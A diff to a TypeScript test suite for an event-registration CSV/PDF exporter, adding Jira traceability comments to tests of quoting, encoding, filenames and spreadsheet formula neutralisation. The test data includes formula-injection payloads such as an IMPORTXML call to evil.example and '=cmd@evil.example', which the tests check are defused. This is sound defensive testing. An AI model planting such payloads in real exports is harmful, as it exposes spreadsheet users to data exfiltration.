@@ -28,6 +28,7 @@ const HEADER = 'Name,Email,Contact Number,Special Requirements,Registration Date
 const csvText = (buffer: Buffer) => buffer.toString('utf8');
 
 describe('SPM-63 AC4: the CSV file matches the report', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-A
   // Oracle (SPEC 04-A, D6/D7/D9): header, then Dev, Alice, Chloe in registration-date order; dates in SGT without a
   // zone suffix; BOM first; CRLF ends every record including the last.
@@ -49,6 +50,7 @@ describe('SPM-63 AC4: the CSV file matches the report', () => {
     );
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-A
   // Oracle (D9): the file is UTF-8 and starts with the three BOM bytes EF BB BF.
   // Kills: BOM omitted (Excel mis-decodes non-ASCII); a Latin-1 or UTF-16 encoding.
@@ -60,6 +62,7 @@ describe('SPM-63 AC4: the CSV file matches the report', () => {
     expect([...bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-C
   // Oracle (SPEC 04-C, D9): an empty report is the header row and its CRLF, and nothing else.
   // Kills: M18 header dropped when there are no rows; a stray blank line.
@@ -74,6 +77,7 @@ describe('SPM-63 AC4: the CSV file matches the report', () => {
     expect(body).toBe(`${BOM}${HEADER}\r\n`);
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E-ISO
   // Oracle (ISO-1): building the file must not modify the report that the screen and the PDF also use.
   // Kills: rows neutralised or sorted in place (aliasing).
@@ -91,6 +95,7 @@ describe('SPM-63 AC4: the CSV file matches the report', () => {
 });
 
 describe('SPM-63 AC4: the export filename is "<event name>_registrations.<ext>"', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-A
   // Oracle (user request): the downloaded file is named after the event (lowercase, spaces as underscores), then "_registrations", then the extension.
   // Kills: the event id or a date used instead of the name; the extension or separator changed; uppercase letters not converted.
@@ -128,6 +133,7 @@ describe('SPM-63 AC4: the export filename is "<event name>_registrations.<ext>"'
 });
 
 describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-D
   // Oracle (SPEC 04-D, RFC 4180): a comma forces quotes.
   // Kills: M10 comma quoting removed (the name would split into two columns).
@@ -139,6 +145,7 @@ describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
     expect(cell).toBe('"Smith, John"');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-D
   // Oracle (SPEC 04-D): a plus sign is ordinary text; the cell stays unquoted and unchanged.
   // Kills: over-quoting; "+" treated as a formula trigger in the middle of a value.
@@ -150,6 +157,7 @@ describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
     expect(cell).toBe('test+tag@example.com');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-D
   // Oracle (SPEC 04-D + F9): RFC 4180 doubles the inner quote: O"Brien -> "O""Brien". The backslash form is rejected.
   // Kills: M11 backslash escaping (O\"Brien); quotes not escaped at all.
@@ -161,6 +169,7 @@ describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
     expect(cell).toBe('"O""Brien"');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-D
   // Oracle (SPEC 04-D "no newlines split rows"): a name with an embedded newline is quoted with the newline kept, so
   // the file has exactly one CRLF per record (header + 2 rows = 3), not one per line of text.
@@ -177,6 +186,7 @@ describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
     expect(body.split('\r\n')).toHaveLength(4); // header, 2 records, then the empty tail after the final CRLF
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-D
   // Oracle (SPEC 04-D "No garbled text"; D9): non-ASCII names are the UTF-8 byte sequences.
   //   Zoë = 5A 6F C3 AB; 陈维志 = E9 99 88 E7 BB B4 E5 BF 97 (hand-encoded from the code points).
@@ -195,6 +205,7 @@ describe('SPM-63 AC4: CSV is RFC 4180 safe and UTF-8', () => {
 });
 
 describe('SPM-63 AC4: formula neutralisation happens at export time, then quoting', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E-INT
   // Oracle (SPEC 04-E, ASSUMED A6 payload): neutralise first (prefix '), then the cell contains quotes, so wrap and
   // double them: "'=IMPORTXML(""http://evil.example/x"",""//a"")".
@@ -210,6 +221,7 @@ describe('SPM-63 AC4: formula neutralisation happens at export time, then quotin
     expect(cell).toBe('"\'=IMPORTXML(""http://evil.example/x"",""//a"")"');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E-INT
   // Oracle (derived, order proof 2): "=a,b" has a comma, so it is prefixed and then quoted: "'=a,b".
   // Quote-then-prefix would give '"=a,b" (a quote in front of the opening quote).
@@ -222,6 +234,7 @@ describe('SPM-63 AC4: formula neutralisation happens at export time, then quotin
     expect(cell).toBe('"\'=a,b"');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E
   // Oracle (SPEC 04-E: four triggers are SPEC =, +, -, @; tab and carriage return per OWASP): each gets a leading '.
   // Kills: any trigger missing from the list.
@@ -240,6 +253,7 @@ describe('SPM-63 AC4: formula neutralisation happens at export time, then quotin
     expect(cleaned).toBe(expected);
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E-BND
   // Oracle (derived): a trigger character anywhere except the first position is harmless and left alone, so real
   // emails and phone-like text are not altered.
@@ -252,6 +266,7 @@ describe('SPM-63 AC4: formula neutralisation happens at export time, then quotin
     expect(cleaned).toBe(input);
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E-INT
   // Oracle (derived): a carriage return makes the neutralised cell need quoting even though it has no comma or quote.
   // Kills: quoting decided from the original text instead of the neutralised text.
@@ -263,6 +278,7 @@ describe('SPM-63 AC4: formula neutralisation happens at export time, then quotin
     expect(cell).toBe('"\'\rcmd"');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E
   // Oracle (SPEC 04-E, A7): the SQL payload has no formula trigger, no comma and no CRLF, so it appears literally.
   // Kills: SQL text altered or escaped by the writer.
@@ -279,6 +295,7 @@ describe('SPM-63 AC4: formula neutralisation happens at export time, then quotin
 });
 
 describe('SPM-63 AC4: every cell of a row goes through the writer', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E
   // Oracle (derived): the email and contact cells are also written through the same rule, so a formula in any
   // column is neutralised, not only in the name.
@@ -296,6 +313,7 @@ describe('SPM-63 AC4: every cell of a row goes through the writer', () => {
     expect(body).toContain("Dev Patel,'=cmd@evil.example,'+6591234567,,27 Sep 2026 15:00,Confirmed\r\n");
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-A
   // Oracle (SPM-61 AC: contact number optional): a missing contact number is an empty cell, keeping six columns.
   // Kills: the cell omitted (five columns) or "undefined"/"null" written.
@@ -369,6 +387,7 @@ describe('SPM-63 AC4: special requirements are part of the exported registration
 });
 
 describe('SPM-63 AC4: a long attendee list continues on further PDF pages', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-B-PAGES
   // Oracle (SPEC 04-B "no truncated text, overflow"): 80 attendees do not fit on one A4 page. The PDF has at least two
   // pages, the first and the last attendee are both present, and the column headings are repeated on the new page
@@ -407,6 +426,7 @@ describe('SPM-63 AC4: a long attendee list continues on further PDF pages', () =
 // A9: filename token is the event id (F8 / Q10)                           -> 04-A filename tests
 
 describe('SPM-61 A-NULL: a legacy registration without details shows Not provided in the PDF, and an empty cell in the CSV', () => {
+  // Traceability: Jira 63 AC3 (matrix 16515107)
   // VIEW-REG-INFO-03-A-NULL
   // Kills: the placeholder missing from the PDF (the cells print nothing), or the CSV given the placeholder (a
   // machine-readable file must keep the empty cell).
@@ -418,6 +438,7 @@ describe('SPM-61 A-NULL: a legacy registration without details shows Not provide
     expect(text.split('Not provided').length - 1).toBe(3);
   });
 
+  // Traceability: Jira 63 AC3 (matrix 16515107)
   it('VIEW-REG-INFO-03-A-NULL: the CSV keeps the empty cells', () => {
     const legacy = makeRow({ registrationId: 'REG-LEGACY-1', fullName: '', email: '', contactNumber: '' });
     const csv = buildCsv(makeReport({ registrations: [legacy], totalConfirmed: 1, availableSpots: 49 })).toString('utf8');
@@ -426,6 +447,7 @@ describe('SPM-61 A-NULL: a legacy registration without details shows Not provide
 });
 
 describe('SPM-63 AC4: an empty report still exports, and the ExportService methods match the pure functions', () => {
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-E
   // Oracle: with no registrations the PDF states "No registrations to display" (MESSAGES.reportEmptyPdf) and draws no
   // attendee table. Kills: the empty branch removed (an empty table with headings is drawn) or the message changed.
@@ -437,6 +459,7 @@ describe('SPM-63 AC4: an empty report still exports, and the ExportService metho
     expect(text).not.toContain('Registration Date');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   // VIEW-REG-INFO-04-A
   // Kills: the service method returning a different format or a different filename or header than the pure function.
   it('VIEW-REG-INFO-04-A: ExportService.csv returns the same bytes as buildCsv', () => {
@@ -444,11 +467,13 @@ describe('SPM-63 AC4: an empty report still exports, and the ExportService metho
     expect(new ExportService().csv(report).equals(buildCsv(report))).toBe(true);
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   it('VIEW-REG-INFO-04-A: ExportService.pdf returns a PDF file', async () => {
     const buffer = await new ExportService().pdf(makeReport());
     expect(buffer.subarray(0, 5).toString('latin1')).toBe('%PDF-');
   });
 
+  // Traceability: Jira 63 AC4 (matrix 16515107)
   it('VIEW-REG-INFO-04-A: ExportService.filename and contentDisposition name the file after the event', () => {
     const service = new ExportService();
     const report = makeReport({ event: { ...makeReport().event, name: 'Cloud 101 Workshop' } });
